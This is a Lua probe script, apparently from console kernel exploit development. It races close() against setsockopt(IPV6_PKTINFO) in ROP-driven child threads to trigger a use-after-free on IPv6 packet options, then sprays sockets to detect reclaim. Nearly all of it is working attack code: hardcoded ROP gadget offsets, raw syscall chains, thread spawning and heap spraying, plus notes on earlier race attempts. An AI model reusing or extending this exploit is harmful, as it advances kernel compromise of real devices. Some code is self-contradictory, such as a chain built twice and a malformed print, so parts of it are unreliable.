-- CRASH_CLASS: HIGH
-- PROBE 1401a: IPv6 pktopts child-thread race
--
-- prior art: 1400a single-thread close+spray 0 anomalies,
--   396f child 5-arg via fn_addr stub, 271g/271h/271i kqueue races clean,
--   500a-500o poll/close UAF confirmed but zone isolation blocked spray
--
-- Context: Two child threads race on the same IPv6 socket:
--   Thread A: setsockopt(fd, IPPROTO_IPV6, IPV6_PKTINFO, ...)
--   Thread B: close(fd)
-- If close frees the pktopts while setsockopt is mid-access, the
-- freed pktopts zone-64 allocation can be reclaimed by a new socket's
-- pktopts. We detect overlap by checking getsockopt readback markers.
--
-- This uses thr_new(455) + fn_addr stub for child syscalls (396f pattern).

print("=== PROBE 1401a: IPv6 PKTOPTS CHILD RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local N = to_num
local function safe_rd(a) local ok, v = pcall(function() return memory.read_dword(a) end); if ok then return to_num(v) end; return nil end
local function safe_rq(a) local ok, v = pcall(function() return memory.read_qword(a) end); if ok then return v end; return nil end
local function safe_wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function safe_wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(v) if type(v) == "table" and v.h then return v.h, v.l end; return 0, to_num(v) end

-- Syscalls
local sc_socket     = mk(97)
local sc_close      = mk(6)
local sc_setsockopt = mk(105)
local sc_getsockopt = mk(118)
local sc_thr_new    = mk(455)
local sc_mmap       = mk(477)
local sc_nanosleep  = mk(240)

-- Get eboot base
local function get_eboot()
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local sc_info = mk(593)
    pcall(function() sc_info(uint64(0), info) end)
    local lo = safe_rd(info + 0x108) or 0
    local hi = safe_rd(info + 0x10C) or 0
    return hi * 0x100000000 + lo
end
local eboot = get_eboot()
print(string.format("[0] eboot = 0x%X", eboot))

-- Gadgets
local pop_rax_ret = eboot + 0x992
local pop_rdi_ret = eboot + 0xC9DFE
local pop_rsi_ret = eboot + 0xD77D
local pop_rdx_ret = eboot + 0x3B02D7
local pop_rcx_ret = eboot + 0xE64
local pop_r8_ret  = eboot + 0x991
local mov_rdi_rax = eboot + 0x92C67  -- mov [rdi], rax; ret

-- fn_addr stub = the loader's syscall entry
local stub = N(syscall.pipe.fn_addr)
print(string.format("[1] fn_addr stub = 0x%X", stub))

local AF_INET6 = 28
local SOCK_DGRAM = 2
local IPPROTO_IPV6 = 41
local IPV6_PKTINFO = 46
local IPPROTO_UDP = 17

-- Verify baseline
local test_fd = N(sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
print(string.format("[2] baseline socket = %d", test_fd))

local pkt = memory.alloc(32)
safe_wq(pkt, uint64(0)); safe_wq(pkt+8, uint64(0)); safe_wd(pkt+16, 0x1234)
local r = N(sc_setsockopt(uint64(test_fd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO), uint64(pkt), uint64(20)))
print(string.format("[2] setsockopt(PKTINFO) = %d", r))
sc_close(uint64(test_fd))

if r ~= 0 then
    print("[!] IPV6_PKTINFO setsockopt failed — cannot proceed")
    return
end

-- Helper: create thr_new child that runs a syscall chain
local function make_child_chain(chain_ops)
    -- Allocate 2 MiB stack
    local stack = sc_mmap(uint64(0), uint64(0x200000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    local stack_addr = N(stack)
    if stack_addr == 0 or stack_addr == 0xFFFFFFFFFFFFFFFF then
        return nil, nil
    end

    -- Build chain on the stack
    local rsp = stack_addr + 0x200000 - 8
    rsp = math.floor(rsp / 16) * 16 - 8  -- align

    local pos = rsp
    local function push(val)
        safe_wq(pos, uint64(val))
        pos = pos + 8
    end

    -- Reset pos to start pushing from rsp
    -- Actually we push DOWN the stack in reverse order
    -- But for ROP, we push forward from RSP since pop reads [RSP] then increments
    -- So we write forward from the initial RSP

    -- The chain: fn_addr expects pop_rax → num → stub
    pos = rsp
    for _, op in ipairs(chain_ops) do
        if op.type == "syscall" then
            -- Set up registers then call stub
            if op.rdi then push(pop_rdi_ret); push(op.rdi) end
            if op.rsi then push(pop_rsi_ret); push(op.rsi) end
            if op.rdx then push(pop_rdx_ret); push(op.rdx) end
            if op.rcx then push(pop_rcx_ret); push(op.rcx) end
            if op.r8  then push(pop_r8_ret);  push(op.r8)  end
            push(pop_rax_ret); push(op.num)
            push(stub)
        elseif op.type == "store" then
            -- mov [rdi], rax; ret — store current rax to address
            push(pop_rdi_ret); push(op.addr)
            push(mov_rdi_rax)
        elseif op.type == "exit" then
            push(pop_rax_ret); push(431)
            push(pop_rdi_ret); push(0)
            push(stub)
        end
    end

    -- Build thr_param
    local param = memory.alloc(0x40)
    safe_wq(param + 0x00, uint64(pop_rax_ret))  -- start_func = first gadget
    safe_wq(param + 0x08, uint64(0))             -- arg (unused)
    safe_wq(param + 0x10, uint64(stack_addr))    -- stack_base
    safe_wq(param + 0x18, uint64(rsp - stack_addr)) -- stack_size (up to RSP)
    -- child_tid at +0x30
    local tid_addr = memory.alloc(8)
    safe_wq(param + 0x30, uint64(N(tid_addr)))

    -- But wait — thr_new expects start_func(arg), not ROP.
    -- For ROP, we need to set RSP to our chain and RIP to pop_rax_ret.
    -- thr_new calls start_func(arg) — it pushes a return address and jumps.
    -- The child starts at start_func with RSP = stack_base + stack_size - 8 (aligned).
    -- So we need start_func = pop_rax_ret, and the stack should start with our chain.

    -- Recalculate: thr_new sets RSP = (stack_base + stack_size) & ~0xF - 8
    -- Then calls start_func(arg) which means: push return_addr, jmp start_func
    -- Actually, from the docs: "RSP = ((stack_base + stack_size) & ~0xF) - 8"
    -- And start_func is called with arg in RDI
    -- So RSP points to the return address, and we want our chain at that RSP

    -- Reset: place chain at the computed RSP location
    local child_rsp = math.floor((stack_addr + 0x200000) / 16) * 16 - 8
    pos = child_rsp
    -- start_func will be called: it's pop_rax_ret, which will pop [RSP] into RAX
    -- But RSP at entry is the thr_new-computed RSP, which has the return address
    -- We need our chain to be what pop_rax_ret reads from

    -- Actually thr_new(start_func, arg) creates a thread that CALLS start_func(arg)
    -- The thread stub in the kernel sets RDI=arg, RSP=computed, RIP=start_func
    -- There's no pushed return address — RIP is set directly
    -- So at entry: RIP=pop_rax_ret, RSP=child_rsp, RDI=arg
    -- pop_rax_ret reads [RSP] into RAX, RSP+=8, then ret reads [RSP] into RIP, RSP+=8

    -- So the chain at child_rsp should be: [rax_val][next_gadget][...]
    -- Let me rewrite:
    pos = child_rsp
    for _, op in ipairs(chain_ops) do
        if op.type == "syscall" then
            if op.rdi then push(pop_rdi_ret); push(op.rdi) end
            if op.rsi then push(pop_rsi_ret); push(op.rsi) end
            if op.rdx then push(pop_rdx_ret); push(op.rdx) end
            if op.rcx then push(pop_rcx_ret); push(op.rcx) end
            if op.r8  then push(pop_r8_ret);  push(op.r8)  end
            push(pop_rax_ret); push(op.num)
            push(stub)
        elseif op.type == "store" then
            push(pop_rdi_ret); push(op.addr)
            push(mov_rdi_rax)
        elseif op.type == "exit" then
            push(pop_rax_ret); push(431)
            push(pop_rdi_ret); push(0)
            push(stub)
        end
    end

    -- Fix thr_param: stack_size should encompass the chain
    safe_wq(param + 0x18, uint64(0x200000))

    return param, tid_addr
end

-- Helper: spawn child
local function spawn_child(chain_ops)
    local param, tid_addr = make_child_chain(chain_ops)
    if not param then return -1 end

    -- Need sysarch(SET_FSBASE=129) prepended for errno safety
    -- Actually, prepend sysarch to the chain_ops
    local fake_tcb = memory.alloc(0x1000)
    safe_wq(fake_tcb, uint64(N(fake_tcb)))  -- self-referencing

    local full_ops = {}
    -- sysarch(129, &fake_tcb_ptr)
    local tcb_ptr = memory.alloc(8)
    safe_wq(tcb_ptr, uint64(N(fake_tcb)))
    full_ops[#full_ops + 1] = {type="syscall", num=165, rdi=129, rsi=N(tcb_ptr)}
    for _, op in ipairs(chain_ops) do
        full_ops[#full_ops + 1] = op
    end
    full_ops[#full_ops + 1] = {type="exit"}

    param, tid_addr = make_child_chain(full_ops)
    if not param then return -1 end

    local ret = N(sc_thr_new(uint64(param), uint64(0x38)))
    return ret
end

-- Phase 2: Race with child threads
print("")
print("--- Phase 2: Child thread race ---")

local ROUNDS = 30
local anomalies = 0

for round = 1, ROUNDS do
    -- Create target socket with marker
    local fd = N(sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
    if fd < 0 then
        print(string.format("[R%d] socket failed", round))
        break
    end

    -- Set unique marker
    safe_wd(pkt + 16, 0xAA00 + round)
    sc_setsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO), uint64(pkt), uint64(20))

    -- Child A: close(fd) in a loop
    local result_a = memory.alloc(16)
    safe_wq(result_a, uint64(0xDEAD))
    local chain_close = {
        {type="syscall", num=6, rdi=fd},  -- close(fd)
        {type="store", addr=N(result_a)},
    }
    -- Child B: setsockopt(fd, IPV6_PKTINFO, different_marker) in a loop
    local result_b = memory.alloc(16)
    safe_wq(result_b, uint64(0xDEAD))
    local new_marker_buf = memory.alloc(32)
    safe_wq(new_marker_buf, uint64(0)); safe_wq(new_marker_buf+8, uint64(0))
    safe_wd(new_marker_buf + 16, 0xCC00 + round)
    local chain_setopt = {
        {type="syscall", num=105, rdi=fd, rsi=IPPROTO_IPV6, rdx=IPV6_PKTINFO,
         rcx=N(new_marker_buf), r8=20},  -- setsockopt
        {type="store", addr=N(result_b)},
    }

    -- Spawn both children
    local ret_a = spawn_child(chain_close)
    local ret_b = spawn_child(chain_setopt)

    -- Wait for children to finish
    local sleep_buf = memory.alloc(16)
    safe_wq(sleep_buf, uint64(0))
    safe_wd(sleep_buf + 8, 10000000)  -- 10 ms
    sc_nanosleep(uint64(sleep_buf), uint64(0))

    -- Check: try to spray new sockets that might reuse the fd
    local spray = {}
    for i = 1, 10 do
        local sfd = N(sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
        if sfd >= 0 then
            safe_wd(pkt + 16, 0xDD00 + i)
            sc_setsockopt(uint64(sfd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO), uint64(pkt), uint64(20))
            spray[#spray + 1] = sfd
        end
    end

    -- Check spray for anomalous markers
    for i, sfd in ipairs(spray) do
        local out = memory.alloc(32)
        local olen = memory.alloc(8)
        safe_wd(olen, 20)
        local gr = N(sc_getsockopt(uint64(sfd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO), uint64(out), uint64(olen)))
        if gr == 0 then
            local got = safe_rd(out + 16) or 0
            local exp = 0xDD00 + i
            if got ~= exp and got ~= 0 then
                anomalies = anomalies + 1
                print(string.format("[R%d] ANOMALY spray fd=%d: expected=0x%X got=0x%X", round, sfd, exp, got))
                if got >= 0xAA00 and got <= 0xAAFF then
                    print("  *** ORIGINAL MARKER FOUND — UAF RECLAIM! ***")
                elseif got >= 0xCC00 and got <= 0xCCFF then
                    print("  *** RACE MARKER FOUND — RACE WON! ***")
                end
            end
        end
    end

    -- Cleanup
    for _, sfd in ipairs(spray) do sc_close(uint64(sfd)) end

    -- Check child results
    local ra = safe_rq(result_a)
    local rb = safe_rq(result_b)
    local h_a, l_a = get_hi_lo(ra)
    local h_b, l_b = get_hi_lo(rb)

    if round <= 5 or round % 10 == 0 then
        print(string.format("[R%d] close=%d setsockopt=%d anomalies=%d",
            round, l_a, l_b, anomalies))
    end
end

print("")
print(string.format("=== RESULTS: %d rounds, %d anomalies ===", ROUNDS, anomalies))
if anomalies > 0 then
    print("*** PKTOPTS OVERLAP DETECTED ***")
else
    print("No overlap in %d rounds. Race window may be too tight for single-shot children.")
    print("Next: try looping children (many close/setsockopt per thread) for sustained race.")
end
print("=== PROBE 1401a COMPLETE ===")
